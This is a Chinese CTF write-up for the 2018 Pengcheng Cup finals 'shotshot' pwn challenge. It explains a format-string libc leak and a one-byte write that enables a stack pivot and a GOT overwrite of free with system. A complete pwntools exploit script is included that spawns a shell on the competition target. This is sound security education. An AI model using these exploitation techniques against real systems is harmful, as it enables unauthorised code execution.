---
title: 鹏城杯 2018 决赛 day1 shotshot writeup
date: 2018-12-10 21:31:41
tags: [pwn, ctf, "鹏城杯", writeup]
---
周四打完xnuca后紧接着打了pcb final。说实话用户体验极差。有关参加鹏城杯决赛的体验，请移步[如何评价天下第一的鹏城杯线下攻防赛？ - 言者850的回答 - 知乎](https://www.zhihu.com/question/305111020/answer/548758534)。这比赛分成两天，两天都是写出了一道的exp，这是第一天shotshot题目的writeup
<!--- more --->
## 题目分析
题目漏洞是@TTX同学找到的。主要有两个。其中`show`函数中

```c
  if ( weapon )
    result = printf(weapon);
```
有个格式化字符串，不过只能leak不能去写栈。

在`dead`函数下
```c
  __isoc99_scanf("%d", &v2);
  *(a1 + v4) = v2;
```
其中，v4是之前`get_id`函数读入的任意值，a1是传入的全局变量，这样就造成了我们能将全局变量后的任意地址写入一个字节。而在写入后，程序的逻辑会去call全局变量后保存的某个地址。这样我们就能有条件地rop了。接下来就是一个短短的rop利用链

首先我们把那个全局变量后的0x20的地方写成`0x400aaf`因为一字节的限制，只能在`0x400a00` ~ `0x400aff`之间跳。我们选择跳到
```
.text:0000000000400AAF                 lea     rax, [rbp+var_40]
.text:0000000000400AB3                 mov     esi, 30h
.text:0000000000400AB8                 mov     rdi, rax
.text:0000000000400ABB                 call    to_read
.text:0000000000400AC0                 lea     rax, [rbp+var_40]
.text:0000000000400AC4                 mov     rsi, rax
.text:0000000000400AC7                 mov     edi, offset aThankYouS ; "Thank you %s\n"
.text:0000000000400ACC                 mov     eax, 0
.text:0000000000400AD1                 call    _printf
.text:0000000000400AD6                 nop
.text:0000000000400AD7                 mov     rax, [rbp+var_8]
.text:0000000000400ADB                 xor     rax, fs:28h
.text:0000000000400AE4                 jz      short locret_400AEB
.text:0000000000400AE6                 call    ___stack_chk_fail
```
然后进入`to_read`函数后，会把`rsp`的值给`rbp`，而此时rsp由于我们直接跳转到`0x400aaf`，没有进行函数进入时到`sub rsp, XX`的操作。所以此时再去读0x30字节就会造成栈溢出。接下来就好办了，将栈布置成如下

1. `8*'a'` padding
2. `printf_got 的地址 +0x20`
3. `0x400aaf` 下一步rop
4. `0x18 * 'a'` padding

这样我们完成了第一阶段的rop，利用`leave ret`将rbp指向got表附近，接下来进行第二步rop。和之前利用一样，栈的布局如下
1. `system addr` 将free写成system
2. `puts addr` 不变
3. `0x400eaa` 将chk_fail函数替换成这个，利用`delete`函数，把原来执行`free(weapon)` 替换成执行`system(weapon)`
然后就get shell了。

## 感想
以上是第二版的exp，第一版的exp本地可以，但是远程不行，主要是可能两次执行了system函数，其中第一次无意义第二次才get shell导致了未知错误。第二版就没有问题了。这个rop链对我来说还是有点长的，尤其是一字节的跳转比较难找到地方，做完这题收获蛮大的。

## 脚本
```python
#! /usr/bin/env python2
# Author: 850
from pwn import *
import os


class BASE(object):
    def __init__(self, remote_host, remote_port, local_elf, gdb_script, _remote_libc, _local_libc):
        """
        initial basic paramaters
        """
        self.rhost = remote_host
        self.rport = remote_port
        self.elf_name = local_elf
        self.gdb_scripts = gdb_script
        self.local_libc = _local_libc
        self.remote_libc = _remote_libc
        self.elf = ELF(self.elf_name)
        context(os='linux', log_level='info')
        context(terminal=["xfce4-terminal", "-e"])

    def local_debug(self, gdb_attach):
        """
        debug with GDB
        """
        self.target = process(self.elf_name)
        self.libc = ELF(self.local_libc)
        self.one_gadget_offset = 0xf02a4
        if gdb_attach:
            gdb.attach(self.target, gdbscript=self.gdb_scripts)

    def remote_attack(self,):
        """
        try remote exploit
        """
        self.libc = ELF(self.remote_libc)
        self.one_gadget_offset = 0xf1147
        self.target. remote(self.rhost, self.rport)

    def leak(self, ):
        """
        use fsb to leak libc_start_main
        """
        self.target.sendafter('Your name :','aaa')
        self.target.sendlineafter('5. exit','1')
        self.target.sendlineafter("Input the length of your weapon's name:",'100')
        self.target.sendlineafter('Input the name:','%11$p')
        self.target.sendlineafter('5. exit','2')
        self.target.recvline()
        data =  self.target.recvline()
        return int(data,16)

    def die(self):
        """
        trigger luckynum
        """
        self.target.sendlineafter('5. exit','1')
        self.target.sendlineafter("Input the length of your weapon's name:",'100')
        self.target.sendlineafter('Input the name:','/bin/sh')

        self.target.sendlineafter('5. exit','4')
        self.target.sendlineafter('3. C++','1')
        self.target.sendlineafter('id:','32')

        self.target.sendlineafter('5. exit','4')
        self.target.sendlineafter('3. C++','4')
        self.target.sendlineafter('5. exit','4')
        self.target.sendlineafter('3. C++','4')
        self.target.sendlineafter('5. exit','4')
        self.target.sendlineafter('3. C++','4')

    def run(self,):
        libc_start_main = self.leak() - 243
        print "libc_start_main addr: " + hex(libc_start_main)

        libc_addr = libc_start_main - self.libc.symbols['__libc_start_main']
        print "libc base addr: " + hex(libc_addr)

        self.die()
        to_read = 0x400aaf
        one_gadget_addr = libc_addr + self.one_gadget_offset
        self.target.sendlineafter('luckynum:',str(int(to_read)))

        printf_got = 0x602038
        fake_rbp = printf_got + 0x20

        self.target.send("A"*0x8+ p64(fake_rbp) +p64(0x400aaf) + "a" * 0x18)
        system_addr = libc_addr + self.libc.symbols['system'] 
        puts_addr = libc_addr + self.libc.symbols['puts']

        print "system addr: " + hex(system_addr)
        self.target.send(p64(system_addr) + p64(puts_addr) + p64(0x400eaa))

        self.target.interactive()

solve = BASE(
    remote_host="172.91.0.138",
    remote_port=8084,
    local_elf="./shotshot",
    _remote_libc="./libc.so.6",
    _local_libc="/lib64/libc.so.6",
    gdb_script="b *0x400D60\nb *0x400a7e"
)

solve.local_debug(gdb_attach=False)
# solve.remote_attack()
solve.run()
```

